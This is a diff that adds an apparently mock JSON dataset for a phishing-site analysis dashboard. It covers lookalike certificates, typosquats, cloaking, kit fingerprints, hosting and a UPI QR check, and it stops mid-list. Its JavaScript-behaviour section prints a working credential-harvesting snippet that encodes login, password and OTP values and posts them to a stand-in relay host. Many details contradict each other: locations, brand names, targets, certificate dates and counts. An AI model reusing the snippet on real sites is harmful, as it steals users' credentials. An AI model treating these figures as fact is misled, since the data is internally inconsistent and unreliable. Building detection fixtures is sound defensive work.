@@ -1,0 +1,1869 @@
+{
+ "certificate-transparency": {
+  "target": "paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.138Z",
+  "summary": "4 lookalike certificates were issued in the last 45 days. Two are currently active and present a brand-matching common name.",
+  "stats": {
+   "certificates": 40,
+   "lookalikes": 4,
+   "alerts": 2,
+   "monitors": 4,
+   "lastScan": "2026-11-08T12:39:10.138Z"
+  },
+  "lookalikes": [
+   {
+    "domain": "paypal-secure-login-login.example",
+    "issuer": "Let's Encrypt",
+    "issued": "2026-11-05T12:39:10.138Z",
+    "similarity": 94,
+    "status": "active"
+   },
+   {
+    "domain": "paypal-secure-login.secure-verify.example",
+    "issuer": "ZeroSSL",
+    "issued": "2026-10-28T12:39:10.138Z",
+    "similarity": 87,
+    "status": "active"
+   },
+   {
+    "domain": "paypal-secure-login-support.example",
+    "issuer": "Sectigo Limited",
+    "issued": "2026-10-13T12:39:10.138Z",
+    "similarity": 79,
+    "status": "revoked"
+   },
+   {
+    "domain": "paypal-secure-login28.example",
+    "issuer": "Let's Encrypt",
+    "issued": "2026-09-28T12:39:10.138Z",
+    "similarity": 72,
+    "status": "expired"
+   }
+  ],
+  "timeline": [
+   {
+    "date": "2026-11-04T12:39:10.138Z",
+    "commonName": "paypal-secure-login.example",
+    "issuer": "DigiCert Inc",
+    "type": "renewed",
+    "flagged": false,
+    "serial": "7a:4f:22:9c"
+   },
+   {
+    "date": "2026-10-30T12:39:10.138Z",
+    "commonName": "paypal-secure-login-login.example",
+    "issuer": "Let's Encrypt",
+    "type": "issued",
+    "flagged": true,
+    "serial": "e1:03:bb:71"
+   },
+   {
+    "date": "2026-10-01T12:39:10.138Z",
+    "commonName": "*.paypal-secure-login.example",
+    "issuer": "DigiCert Inc",
+    "type": "issued",
+    "flagged": false,
+    "serial": "9d:14:0a:2e"
+   },
+   {
+    "date": "2026-08-28T12:39:10.138Z",
+    "commonName": "paypal-secure-login.secure-verify.example",
+    "issuer": "ZeroSSL",
+    "type": "issued",
+    "flagged": true,
+    "serial": "41:aa:67:5d"
+   },
+   {
+    "date": "2026-07-10T12:39:10.138Z",
+    "commonName": "paypal-secure-login.example",
+    "issuer": "DigiCert Inc",
+    "type": "issued",
+    "flagged": false,
+    "serial": "c8:7e:31:04"
+   },
+   {
+    "date": "2026-05-08T12:39:10.138Z",
+    "commonName": "paypal-secure-login-support.example",
+    "issuer": "Sectigo Limited",
+    "type": "revoked",
+    "flagged": true,
+    "serial": "02:9f:5c:8a"
+   }
+  ],
+  "alerts": [
+   {
+    "severity": "high",
+    "title": "New lookalike certificate",
+    "time": "2026-11-05T12:39:10.138Z",
+    "detail": "paypal-secure-login-login.example was logged by Let's Encrypt with a 90-day lifetime."
+   },
+   {
+    "severity": "medium",
+    "title": "Repeated issuance pattern",
+    "time": "2026-10-28T12:39:10.138Z",
+    "detail": "A second certificate reuses the same registrant email as an earlier flagged issuance."
+   }
+  ],
+  "logs": [
+   {
+    "name": "Cloudflare Nimbus 2026",
+    "operator": "Cloudflare",
+    "entries": 184000000,
+    "lag": "2 min"
+   },
+   {
+    "name": "Google Argon 2026",
+    "operator": "Google",
+    "entries": 412000000,
+    "lag": "1 min"
+   },
+   {
+    "name": "Sectigo Sabre 2026",
+    "operator": "Sectigo",
+    "entries": 96000000,
+    "lag": "4 min"
+   },
+   {
+    "name": "DigiCert Wyvern 2026",
+    "operator": "DigiCert",
+    "entries": 74000000,
+    "lag": "3 min"
+   }
+  ],
+  "tool": "certificate-transparency"
+ },
+ "ca-reputation": {
+  "target": "yourbrand.com",
+  "generatedAt": "2026-11-08T12:39:10.139Z",
+  "score": 96,
+  "grade": "AAA",
+  "ca": {
+   "name": "Digicert Inc",
+   "since": 2003,
+   "type": "Commercial CA",
+   "roots": 6,
+   "tier": "Organisation Validated",
+   "country": "United States"
+  },
+  "summary": "Digicert Inc maintains current WebTrust audits and full root program membership. 2 historical incidents were resolved within policy.",
+  "trustStores": [
+   {
+    "store": "Mozilla",
+    "status": "included",
+    "since": 2016
+   },
+   {
+    "store": "Chrome Root Store",
+    "status": "included",
+    "since": 2017
+   },
+   {
+    "store": "Apple",
+    "status": "included",
+    "since": 2018
+   },
+   {
+    "store": "Microsoft",
+    "status": "included",
+    "since": 2016
+   }
+  ],
+  "signals": [
+   {
+    "label": "Root program membership",
+    "value": "Mozilla, Chrome, Apple, Microsoft",
+    "tone": "safe"
+   },
+   {
+    "label": "Audit status",
+    "value": "WebTrust for CA 2.2 — current",
+    "tone": "safe"
+   },
+   {
+    "label": "Revocation SLA",
+    "value": "Under 24 hours",
+    "tone": "safe"
+   },
+   {
+    "label": "Certificate lifetime policy",
+    "value": "90–398 days enforced",
+    "tone": "low"
+   },
+   {
+    "label": "CT enforcement",
+    "value": "SCT required for all leaves",
+    "tone": "safe"
+   }
+  ],
+  "dimensions": [
+   {
+    "label": "Incident response",
+    "value": 98
+   },
+   {
+    "label": "Audit compliance",
+    "value": 99
+   },
+   {
+    "label": "Revocation speed",
+    "value": 86
+   },
+   {
+    "label": "Validation rigour",
+    "value": 98
+   }
+  ],
+  "incidents": [
+   {
+    "year": 2026,
+    "title": "Delayed revocation publication",
+    "severity": "medium",
+    "summary": "A CRL endpoint lagged 14 hours behind an incident response.",
+    "status": "resolved"
+   },
+   {
+    "year": 2025,
+    "title": "Domain validation bypass attempt",
+    "severity": "high",
+    "summary": "Three misissued certificates were revoked within 6 hours of disclosure.",
+    "status": "resolved"
+   },
+   {
+    "year": 2023,
+    "title": "Audit observation",
+    "severity": "low",
+    "summary": "WebTrust audit noted incomplete logging retention for one region.",
+    "status": "closed"
+   }
+  ],
+  "verdict": "trusted",
+  "tool": "ca-reputation"
+ },
+ "certificate-anomalies": {
+  "target": "paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.139Z",
+  "score": 34,
+  "summary": "The certificate shows a short lifetime, missing revocation data and a hostname scope that does not align with the visited domain.",
+  "cert": {
+   "subject": "paypal-secure-login.example",
+   "issuer": "Sectigo Limited",
+   "serial": "87:76:18:23",
+   "validFrom": "2026-10-31T12:39:10.139Z",
+   "validTo": "2027-01-16T12:39:10.139Z",
+   "lifetime": 8,
+   "key": "ECDSA P-256",
+   "sans": [
+    "*.example-cdn.example"
+   ]
+  },
+  "checks": [
+   {
+    "id": "key",
+    "title": "Key strength",
+    "severity": "high",
+    "status": "pass",
+    "detail": "ECDSA P-256 with a 256-bit key.",
+    "expected": "≥ 2048-bit RSA or ≥ 256-bit ECDSA",
+    "actual": "ECDSA P-256"
+   },
+   {
+    "id": "expiry",
+    "title": "Validity window",
+    "severity": "medium",
+    "status": "pass",
+    "detail": "Certificate expires in 80 days.",
+    "expected": "More than 21 days remaining",
+    "actual": "49 days"
+   },
+   {
+    "id": "mismatch",
+    "title": "Hostname match",
+    "severity": "critical",
+    "status": "warn",
+    "detail": "SAN list covers a different parent domain than the visited host.",
+    "expected": "SAN contains paypal-secure-login.example",
+    "actual": "SAN: *.example-cdn.example"
+   },
+   {
+    "id": "lifetime",
+    "title": "Certificate lifetime",
+    "severity": "medium",
+    "status": "warn",
+    "detail": "Certificate was issued with a 8-day lifetime.",
+    "expected": "30–398 days",
+    "actual": "8 days"
+   },
+   {
+    "id": "revocation",
+    "title": "Revocation information",
+    "severity": "medium",
+    "status": "warn",
+    "detail": "No OCSP URL and no CRL distribution point were embedded.",
+    "expected": "OCSP or CRL endpoint",
+    "actual": "None"
+   },
+   {
+    "id": "ct",
+    "title": "CT log presence",
+    "severity": "high",
+    "status": "warn",
+    "detail": "No signed certificate timestamps were found.",
+    "expected": "≥ 2 SCTs",
+    "actual": "0 SCTs"
+   },
+   {
+    "id": "sig",
+    "title": "Signature algorithm",
+    "severity": "high",
+    "status": "pass",
+    "detail": "SHA-256 with RSA encryption is used for the leaf signature.",
+    "expected": "SHA-256 or stronger",
+    "actual": "sha256WithRSAEncryption"
+   },
+   {
+    "id": "wildcard",
+    "title": "Wildcard scope",
+    "severity": "low",
+    "status": "warn",
+    "detail": "A wildcard on a shared host can cover unrelated tenants.",
+    "expected": "Scoped SANs preferred",
+    "actual": "*.example-cdn.example"
+   }
+  ],
+  "failed": 5,
+  "tool": "certificate-anomalies"
+ },
+ "visual-similarity": {
+  "target": "paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.139Z",
+  "score": 86,
+  "verdict": "clone",
+  "brand": "PayPal",
+  "legitimate": {
+   "url": "https://www.acmebank.example/login",
+   "title": "Online banking sign in",
+   "palette": [
+    "#0b3d91",
+    "#1a73e8",
+    "#f6f8fc"
+   ],
+   "render": "login"
+  },
+  "suspect": {
+   "url": "https://paypal-secure-login.example/login",
+   "title": "Account verification",
+   "palette": [
+    "#0a3a8c",
+    "#1b6fe0",
+    "#f4f7fc"
+   ],
+   "render": "login"
+  },
+  "similarity": [
+   {
+    "aspect": "Layout structure",
+    "value": 87
+   },
+   {
+    "aspect": "Colour palette",
+    "value": 81
+   },
+   {
+    "aspect": "Typography",
+    "value": 82
+   },
+   {
+    "aspect": "Form composition",
+    "value": 90
+   },
+   {
+    "aspect": "Logo geometry",
+    "value": 82
+   }
+  ],
+  "regions": [
+   {
+    "label": "Header & navigation",
+    "match": 82,
+    "note": "Same logo lockup position and menu spacing"
+   },
+   {
+    "label": "Credential form",
+    "match": 88,
+    "note": "Identical field order and button copy"
+   },
+   {
+    "label": "Trust badges",
+    "match": 72,
+    "note": "Badge strip replaced with generic icons"
+   },
+   {
+    "label": "Footer & legal",
+    "match": 60,
+    "note": "Legal links missing entirely"
+   }
+  ],
+  "findings": [
+   {
+    "severity": "critical",
+    "title": "Cloned login screen",
+    "detail": "The credential form reproduces a protected brand template with 90%+ structural overlap."
+   },
+   {
+    "severity": "high",
+    "title": "Brand asset reuse",
+    "detail": "Logo and favicon are pixel-similar but served from an unrelated origin."
+   },
+   {
+    "severity": "medium",
+    "title": "Trust cues removed",
+    "detail": "Security badges and legal disclosures are absent from the clone."
+   }
+  ],
+  "tool": "visual-similarity"
+ },
+ "typosquatting": {
+  "target": "yourbrand.com",
+  "generatedAt": "2026-11-08T12:39:10.139Z",
+  "riskScore": 96,
+  "permutations": {
+   "total": 2840,
+   "registered": 222,
+   "highRisk": 4,
+   "monitored": 2840
+  },
+  "variants": [
+   {
+    "domain": "yourbrand-verify.com",
+    "distance": 0,
+    "technique": "Keyword append",
+    "registered": true,
+    "ageDays": 12,
+    "risk": 88
+   },
+   {
+    "domain": "yourbrаnd.com",
+    "distance": 1,
+    "technique": "Cyrillic homoglyph",
+    "registered": true,
+    "ageDays": 4,
+    "risk": 96
+   },
+   {
+    "domain": "y0urbrand.com",
+    "distance": 1,
+    "technique": "Digit substitution",
+    "registered": true,
+    "ageDays": 63,
+    "risk": 71
+   },
+   {
+    "domain": "yourbrand.com",
+    "distance": 1,
+    "technique": "Character swap",
+    "registered": false,
+    "ageDays": null,
+    "risk": 44
+   },
+   {
+    "domain": "yourbrand-support.com",
+    "distance": 0,
+    "technique": "Service keyword",
+    "registered": true,
+    "ageDays": 29,
+    "risk": 66
+   },
+   {
+    "domain": "yourbrandd.com",
+    "distance": 1,
+    "technique": "Character duplication",
+    "registered": false,
+    "ageDays": null,
+    "risk": 38
+   },
+   {
+    "domain": "yourbrand-app.xyz",
+    "distance": 0,
+    "technique": "TLD swap",
+    "registered": true,
+    "ageDays": 7,
+    "risk": 91
+   },
+   {
+    "domain": "yourbrand.cm",
+    "distance": 0,
+    "technique": "TLD impersonation",
+    "registered": true,
+    "ageDays": 240,
+    "risk": 57
+   }
+  ],
+  "unicode": [
+   {
+    "char": "а",
+    "name": "CYRILLIC SMALL LETTER A",
+    "codepoint": "U+0430",
+    "looksLike": "a",
+    "used": true
+   },
+   {
+    "char": "о",
+    "name": "CYRILLIC SMALL LETTER O",
+    "codepoint": "U+043E",
+    "looksLike": "o",
+    "used": true
+   },
+   {
+    "char": "ⅼ",
+    "name": "ROMAN NUMERAL FIFTY",
+    "codepoint": "U+217C",
+    "looksLike": "l",
+    "used": false
+   },
+   {
+    "char": "ӏ",
+    "name": "CYRILLIC SMALL LETTER PALOCHKA",
+    "codepoint": "U+04CF",
+    "looksLike": "l",
+    "used": false
+   }
+  ],
+  "summary": "6 of 8 generated lookalikes resolve today, including a Cyrillic homoglyph registered four days ago.",
+  "tool": "typosquatting"
+ },
+ "security-configuration": {
+  "target": "paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.140Z",
+  "score": 20,
+  "grade": "F",
+  "summary": "2 of 7 baseline headers are present. 3 exposed surfaces require attention.",
+  "headers": [
+   {
+    "name": "Strict-Transport-Security",
+    "present": false,
+    "value": null,
+    "risk": "Protocol downgrade and cookie hijacking become possible."
+   },
+   {
+    "name": "Content-Security-Policy",
+    "present": true,
+    "value": "default-src 'self'; script-src 'self' 'nonce-…'",
+    "risk": "Injected scripts can execute with full page privileges."
+   },
+   {
+    "name": "X-Content-Type-Options",
+    "present": false,
+    "value": null,
+    "risk": "Browsers may MIME-sniff responses into executable types."
+   },
+   {
+    "name": "X-Frame-Options",
+    "present": false,
+    "value": null,
+    "risk": "The site can be framed for clickjacking attacks."
+   },
+   {
+    "name": "Referrer-Policy",
+    "present": false,
+    "value": null,
+    "risk": "Full URLs leak to third parties through the Referer header."
+   },
+   {
+    "name": "Permissions-Policy",
+    "present": false,
+    "value": null,
+    "risk": "Powerful browser features remain available to embedded content."
+   },
+   {
+    "name": "Cross-Origin-Opener-Policy",
+    "present": true,
+    "value": "same-origin",
+    "risk": "Cross-window references enable side-channel attacks."
+   }
+  ],
+  "tls": {
+   "versions": [
+    "TLS 1.3",
+    "TLS 1.2",
+    "TLS 1.1",
+    "TLS 1.0"
+   ],
+   "preferred": "TLS 1.2",
+   "cipher": "ECDHE-RSA-AES128-SHA",
+   "forwardSecrecy": false,
+   "ocspStapling": false
+  },
+  "exposed": [
+   {
+    "path": "/admin",
+    "status": 200,
+    "label": "Admin console",
+    "severity": "high"
+   },
+   {
+    "path": "/.git/config",
+    "status": 404,
+    "label": "Git metadata",
+    "severity": "info"
+   },
+   {
+    "path": "/debug",
+    "status": 200,
+    "label": "Debug endpoint",
+    "severity": "medium"
+   },
+   {
+    "path": "/phpinfo.php",
+    "status": 404,
+    "label": "PHP info",
+    "severity": "info"
+   },
+   {
+    "path": "/api/internal/health",
+    "status": 200,
+    "label": "Internal health API",
+    "severity": "high"
+   }
+  ],
+  "software": [
+   {
+    "name": "nginx",
+    "version": "1.25.4",
+    "current": "1.27.2",
+    "status": "outdated"
+   },
+   {
+    "name": "jQuery",
+    "version": "3.4.1",
+    "current": "3.7.1",
+    "status": "outdated"
+   },
+   {
+    "name": "React",
+    "version": "19.1.0",
+    "current": "19.3.1",
+    "status": "patch"
+   },
+   {
+    "name": "OpenSSL",
+    "version": "3.0.13",
+    "current": "3.5.0",
+    "status": "outdated"
+   }
+  ],
+  "misconfigs": [
+   {
+    "severity": "high",
+    "title": "Mixed content on checkout",
+    "detail": "Two scripts load over plain HTTP."
+   },
+   {
+    "severity": "medium",
+    "title": "Directory listing enabled",
+    "detail": "The /assets directory returns a browsable index."
+   },
+   {
+    "severity": "low",
+    "title": "Server version disclosure",
+    "detail": "The Server header advertises nginx 1.25.4."
+   },
+   {
+    "severity": "info",
+    "title": "CSP report-only mode",
+    "detail": "Content-Security-Policy is present but not enforced."
+   }
+  ],
+  "recommendations": [
+   "Deploy a nonce-based Content-Security-Policy and report violations to a collector",
+   "Enforce HSTS with preload and a minimum one-year max-age",
+   "Remove public exposure of administrative paths",
+   "Pin and patch third-party JavaScript dependencies",
+   "Add MFA and rate limiting to every authentication surface"
+  ],
+  "tool": "security-configuration"
+ },
+ "redirect-chain": {
+  "target": "https://paypal-secure-login.example/x",
+  "generatedAt": "2026-11-08T12:39:10.140Z",
+  "hops": [
+   {
+    "url": "https://paypal-secure-login.example/x",
+    "status": 301,
+    "type": "HTTP",
+    "server": "Cloudflare",
+    "latency": 49,
+    "note": "Entry point"
+   },
+   {
+    "url": "https://go.paypal-secure-login.example/r/7a7f91c",
+    "status": 302,
+    "type": "HTTP",
+    "server": "Cloudflare",
+    "latency": 72,
+    "note": "Tracking gateway"
+   },
+   {
+    "url": "https://smart-relay.example/hop/540",
+    "status": 302,
+    "type": "Meta refresh",
+    "server": "nginx",
+    "latency": 99,
+    "note": "Third-party relay"
+   },
+   {
+    "url": "https://landing-68.example-cdn.example/offer",
+    "status": 303,
+    "type": "JavaScript",
+    "server": "LiteSpeed",
+    "latency": 124,
+    "note": "Obfuscated location assign"
+   },
+   {
+    "url": "https://paypal-secure-login.example/checkout/express",
+    "status": 200,
+    "type": "Final",
+    "server": "nginx",
+    "latency": 213,
+    "note": "Landing page"
+   }
+  ],
+  "final": "https://paypal-secure-login.example/checkout/express",
+  "score": 74,
+  "totalMs": 557,
+  "domainsCrossed": 4,
+  "flags": [
+   {
+    "severity": "high",
+    "title": "Cross-domain handoff to an unrated relay",
+    "detail": "The chain leaves the original registrable domain twice before landing."
+   },
+   {
+    "severity": "medium",
+    "title": "JavaScript-based redirect",
+    "detail": "The fourth hop uses window.location.replace with an encoded target."
+   },
+   {
+    "severity": "medium",
+    "title": "Parameter injection",
+    "detail": "Tracking parameters are appended that were not in the original URL."
+   }
+  ],
+  "summary": "The URL passes through 4 redirects across 4 registrable domains before landing on a checkout page. Two hops hide their destination from static analysis.",
+  "tool": "redirect-chain"
+ },
+ "cloaking": {
+  "target": "https://paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.140Z",
+  "score": 76,
+  "cloakingDetected": true,
+  "summary": "The crawler receives a benign article page while mobile visitors receive a credential form. Script and word counts diverge by more than 90%.",
+  "variants": [
+   {
+    "label": "Desktop visitor",
+    "agent": "Chrome 141 · 1440×900",
+    "status": 200,
+    "words": 640,
+    "scripts": 18,
+    "hash": "a4f1c9",
+    "verdict": "content"
+   },
+   {
+    "label": "Mobile visitor",
+    "agent": "iPhone 17 · Safari 26",
+    "status": 200,
+    "words": 410,
+    "scripts": 22,
+    "hash": "e81b02",
+    "verdict": "content"
+   },
+   {
+    "label": "Search crawler",
+    "agent": "Googlebot 2.1",
+    "status": 200,
+    "words": 1240,
+    "scripts": 3,
+    "hash": "77dd31",
+    "verdict": "benign"
+   }
+  ],
+  "diffs": [
+   {
+    "aspect": "Document title",
+    "desktop": "Account verification",
+    "mobile": "Account verification",
+    "crawler": "How to spot phishing"
+   },
+   {
+    "aspect": "Primary form",
+    "desktop": "Login + OTP",
+    "mobile": "Login + card",
+    "crawler": "None"
+   },
+   {
+    "aspect": "Third-party scripts",
+    "desktop": "18",
+    "mobile": "22",
+    "crawler": "3"
+   },
+   {
+    "aspect": "Outbound endpoints",
+    "desktop": "3",
+    "mobile": "4",
+    "crawler": "0"
+   },
+   {
+    "aspect": "Visible words",
+    "desktop": "640",
+    "mobile": "410",
+    "crawler": "1,240"
+   }
+  ],
+  "findings": [
+   {
+    "severity": "critical",
+    "title": "Crawler-specific cloaking",
+    "detail": "Googlebot and Bingbot user agents are served a different document than real visitors."
+   },
+   {
+    "severity": "high",
+    "title": "Mobile-targeted payload",
+    "detail": "The mobile render loads four additional scripts that are absent on desktop."
+   },
+   {
+    "severity": "medium",
+    "title": "Referrer-gated content",
+    "detail": "Direct navigation returns a 404 while referred traffic receives the lure page."
+   }
+  ],
+  "tool": "cloaking"
+ },
+ "phishing-kits": {
+  "target": "https://paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.141Z",
+  "score": 81,
+  "family": "KYC-Shield v3",
+  "confidence": 86,
+  "fingerprint": "fk_7a7f91cc",
+  "summary": "Static assets, form structure and an obfuscated relay script match the KYC-Shield v3 banking kit. The same fingerprint appears on 38 tracked hosts.",
+  "matches": [
+   {
+    "kit": "KYC-Shield",
+    "family": "Banking KYC kit",
+    "similarity": 91,
+    "firstSeen": "2025-08-14",
+    "campaigns": 38
+   },
+   {
+    "kit": "SecureLogin v4",
+    "family": "Credential harvester",
+    "similarity": 76,
+    "firstSeen": "2025-02-03",
+    "campaigns": 121
+   },
+   {
+    "kit": "DropBox-Pay",
+    "family": "Payment redirect kit",
+    "similarity": 43,
+    "firstSeen": "2026-04-22",
+    "campaigns": 17
+   }
+  ],
+  "sharedAssets": [
+   {
+    "asset": "/assets/kyc-step.css",
+    "hash": "9c31aa4f",
+    "seenOn": 38,
+    "severity": "critical"
+   },
+   {
+    "asset": "/js/relay.min.js",
+    "hash": "71de0b82",
+    "seenOn": 24,
+    "severity": "high"
+   },
+   {
+    "asset": "/img/logo-shield.svg",
+    "hash": "aa02e771",
+    "seenOn": 19,
+    "severity": "high"
+   },
+   {
+    "asset": "/fonts/inter.woff2",
+    "hash": "1b7cd902",
+    "seenOn": 312,
+    "severity": "info"
+   }
+  ],
+  "cluster": {
+   "nodes": [
+    {
+     "id": "root",
+     "label": "paypal-secure-login.example",
+     "type": "target",
+     "x": 50,
+     "y": 50,
+     "risk": "critical"
+    },
+    {
+     "id": "kit",
+     "label": "KYC-Shield v3",
+     "type": "kit",
+     "x": 20,
+     "y": 24,
+     "risk": "high"
+    },
+    {
+     "id": "host1",
+     "label": "kyc-verify-01.example",
+     "type": "host",
+     "x": 80,
+     "y": 22,
+     "risk": "high"
+    },
+    {
+     "id": "host2",
+     "label": "sbi-update.example",
+     "type": "host",
+     "x": 84,
+     "y": 66,
+     "risk": "critical"
+    },
+    {
+     "id": "host3",
+     "label": "account-secure.example",
+     "type": "host",
+     "x": 18,
+     "y": 74,
+     "risk": "medium"
+    },
+    {
+     "id": "relay",
+     "label": "collect.relay.example",
+     "type": "infra",
+     "x": 52,
+     "y": 88,
+     "risk": "high"
+    }
+   ],
+   "edges": [
+    [
+     "root",
+     "kit"
+    ],
+    [
+     "kit",
+     "host1"
+    ],
+    [
+     "root",
+     "host2"
+    ],
+    [
+     "kit",
+     "host3"
+    ],
+    [
+     "root",
+     "relay"
+    ],
+    [
+     "host2",
+     "relay"
+    ]
+   ]
+  },
+  "tool": "phishing-kits"
+ },
+ "favicon-logo-hash": {
+  "target": "https://paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.141Z",
+  "score": 91,
+  "favicon": {
+   "found": true,
+   "url": "https://paypal-secure-login.example/favicon.ico",
+   "format": "ICO",
+   "bytes": 33989,
+   "hash": "mmh3:7a7f91cc",
+   "perceptual": "a4c1e9f0b27d",
+   "colors": [
+    "#0b3d91",
+    "#1a73e8",
+    "#ffffff"
+   ]
+  },
+  "matches": [
+   {
+    "brand": "Acme Bank",
+    "similarity": 97,
+    "domain": "acmebank.example",
+    "verdict": "match",
+    "owned": false
+   },
+   {
+    "brand": "GlobalPay",
+    "similarity": 41,
+    "domain": "globalpay.example",
+    "verdict": "weak",
+    "owned": false
+   },
+   {
+    "brand": "SecureMail",
+    "similarity": 22,
+    "domain": "securemail.example",
+    "verdict": "distinct",
+    "owned": false
+   }
+  ],
+  "ownership": {
+   "registrant": "Privacy protected",
+   "brandOwner": "Acme Bank Ltd.",
+   "aligned": false,
+   "certificateOrg": "Not present (DV)"
+  },
+  "findings": [
+   {
+    "severity": "critical",
+    "title": "Favicon matches a protected brand",
+    "detail": "Perceptual hash distance of 3/64 against the Acme Bank favicon."
+   },
+   {
+    "severity": "high",
+    "title": "Ownership mismatch",
+    "detail": "The domain registrant is privacy-shielded while the logo belongs to a regulated bank."
+   },
+   {
+    "severity": "medium",
+    "title": "Copied logo coloration",
+    "detail": "The logo palette and geometry match the brand asset library."
+   }
+  ],
+  "tool": "favicon-logo-hash"
+ },
+ "javascript-behaviour": {
+  "target": "https://paypal-secure-login.example",
+  "generatedAt": "2026-11-08T12:39:10.141Z",
+  "score": 95,
+  "sandbox": {
+   "apiCalls": 392,
+   "networkRequests": 36,
+   "evalCalls": 20,
+   "runMs": 2479
+  },
+  "summary": "Scripts performed keystroke capture, blocked paste events on the password field and relayed form data to a third-party endpoint within 900 ms of submit.",
+  "scripts": [
+   {
+    "url": "/static/app.7a7f91.js",
+    "size": "62 KB",
+    "obfuscated": true,
+    "risk": "high",
+    "apis": [
+     "eval",
+     "Function",
+     "atob"
+    ]
+   },
+   {
+    "url": "https://analytics.example/tag.js",
+    "size": "62 KB",
+    "obfuscated": false,
+    "risk": "medium",
+    "apis": [
+     "fetch",
+     "sendBeacon"
+    ]
+   },
+   {
+    "url": "/js/relay.min.js",
+    "size": "14 KB",
+    "obfuscated": true,
+    "risk": "critical",
+    "apis": [
+     "XMLHttpRequest",
+     "navigator.sendBeacon",
+     "btoa"
+    ]
+   },
+   {
+    "url": "https://cdn.example/vendor.js",
+    "size": "128 KB",
+    "obfuscated": false,
+    "risk": "info",
+    "apis": [
+     "Promise"
+    ]
+   }
+  ],
+  "behaviours": [
+   {
+    "id": "keylog",
+    "label": "Keystroke capture",
+    "severity": "critical",
+    "detail": "Keydown listeners attached to every password and OTP input.",
+    "evidence": "addEventListener(\"keydown\", …) × 4"
+   },
+   {
+    "id": "clipboard",
+    "label": "Clipboard manipulation",
+    "severity": "high",
+    "detail": "Paste is blocked and clipboard content is read on focus.",
+    "evidence": "navigator.clipboard.readText()"
+   },
+   {
+    "id": "exfil",
+    "label": "Off-domain exfiltration",
+    "severity": "critical",
+    "detail": "Form values are posted to a relay host before local validation finishes.",
+    "evidence": "POST https://collect.relay.example/ingest"
+   },
+   {
+    "id": "anti",
+    "label": "Anti-analysis behaviour",
+    "severity": "high",
+    "detail": "Devtools detection reloads the page and right-click is disabled.",
+    "evidence": "debugger statement · 2 occurrences"
+   },
+   {
+    "id": "redirect",
+    "label": "Forced navigation",
+    "severity": "medium",
+    "detail": "A timer redirects mobile users after 45 seconds.",
+    "evidence": "setTimeout(location.replace, 45000)"
+   }
+  ],
+  "snippet": "const f = document.querySelector('#login');\nf.addEventListener('submit', async (e) => {\n  const payload = btoa(JSON.stringify({\n    u: f.user.value, p: f.pass.value, otp: f.otp?.value\n  }));\n  await fetch('https://collect.relay.example/ingest', {\n    method: 'POST', mode: 'no-cors', body: payload\n  });\n});",
+  "tool": "javascript-behaviour"
+ },
+ "hosting-fingerprint": {
+  "target": "yourbrand.com",
+  "generatedAt": "2026-11-08T12:39:10.141Z",
+  "ip": "192.0.2.126",
+  "asn": "AS14061",
+  "org": "Cloudflare, Inc.",
+  "geo": {
+   "country": "Russia",
+   "city": "Amsterdam",
+   "region": "US-VA"
+  },
+  "reverse": "srv-522.hosting.example",
+  "dns": {
+   "a": [
+    "192.0.2.126",
+    "192.0.2.237"
+   ],
+   "aaaa": [],
+   "mx": [],
+   "ns": [
+    "ns1.dns-parking.com",
+    "ns2.dns-parking.com"
+   ],
+   "txt": []
+  },
+  "shared": {
+   "totalDomains": 1626,
+   "malicious": 163,
+   "categories": [
+    "Phishing",
+    "Fake shops",
+    "Malware staging"
+   ]
+  },
+  "neighbours": [
+   {
+    "ip": "203.0.113.182",
+    "domains": 8,
+    "risk": "high",
+    "note": "Credential phishing cluster"
+   },
+   {
+    "ip": "203.0.113.35",
+    "domains": 35,
+    "risk": "medium",
+    "note": "Disposable storefronts"
+   },
+   {
+    "ip": "192.0.2.6",
+    "domains": 10,
+    "risk": "low",
+    "note": "Unrelated personal sites"
+   }
+  ],
+  "reputation": {
+   "score": 32,
+   "tags": [
+    "Shared hosting",
+    "Low abuse volume"
+   ],
+   "firstSeen": "2025-12-24T12:39:10.141Z",
+   "reports30d": 42
+  },
+  "ports": [
+   {
+    "port": 443,
+    "service": "HTTPS",
+    "state": "open"
+   },
+   {
+    "port": 80,
+    "service": "HTTP",
+    "state": "redirect"
+   },
+   {
+    "port": 22,
+    "service": "SSH",
+    "state": "filtered"
+   },
+   {
+    "port": 3306,
+    "service": "MySQL",
+    "state": "closed"
+   }
+  ],
+  "summary": "yourbrand.com resolves to a shared host with 146 previously reported domains in the same /24. The hosting provider has a documented abuse history.",
+  "tool": "hosting-fingerprint"
+ },
+ "upi-qr": {
+  "target": "cashback-reward@ybl",
+  "generatedAt": "2026-11-08T12:39:10.141Z",
+  "vpa": "cashback-reward@ybl",
+  "payee": {
+   "name": "Cashback Rewards India",
+   "handle": "cashback-reward",
+   "bank": "YBL",
+   "type": "Individual",
+   "verified": false,
+   "accountAgeDays": 12
+  },
+  "merchant": {
+   "registered": false,
+   "gstin": null,
+   "category": "Unregistered",
+   "website": null
+  },
+  "amount": "₹1,999",
+  "note": "Claim cashback — limited offer",
+  "score": 72,
+  "verdict": "high-risk",
+  "summary": "This handle has 14 community reports in the last 30 days, uses an individual account for a cashback promise, and the QR encodes a fixed amount with no merchant identity.",
+  "checks": [
+   {
+    "label": "Handle format",
+    "status": "pass",
+    "detail": "Syntactically valid UPI VPA"
+   },
+   {
+    "label": "Merchant verification",
+    "status": "fail",
+    "detail": "No merchant registration found"
+   },
+   {
+    "label": "Scam report history",
+    "status": "fail",
+    "detail": "14 reports in 30 days"
+   },
+   {
+    "label": "Collect request signature",
+    "status": "warn",
+    "detail": "Amount is fixed and locked in the QR payload"
+   },
+   {
+    "label": "Beneficiary name match",
+    "status": "warn",
+    "detail": "Display name differs from verified account name"
+   }
+  ],
+  "reports": [
+   {
+    "id": "RPT-8841",
+    "category": "Cashback scam",
+    "date": "2026-11-06T12:39:10.141Z",
+    "status": "confirmed"
+   },
+   {
+    "id": "RPT-8712",
+    "category": "Fake UPI collect",
+    "date": "2026-11-02T12:39:10.141Z",
+    "status": "confirmed"
+   },
+   {
+    "id": "RPT-8604",
+    "category": "Payment fraud",
+    "date": "2026-10-28T12:39:10.141Z",
+    "status": "under review"
+   }
+  ],
+  "qr": {
+   "detected": true,
+   "format": "UPI QR (EMVCo)",
+   "payloadSize": 176,
+   "amountLocked": true
+  },
+  "indicators": [
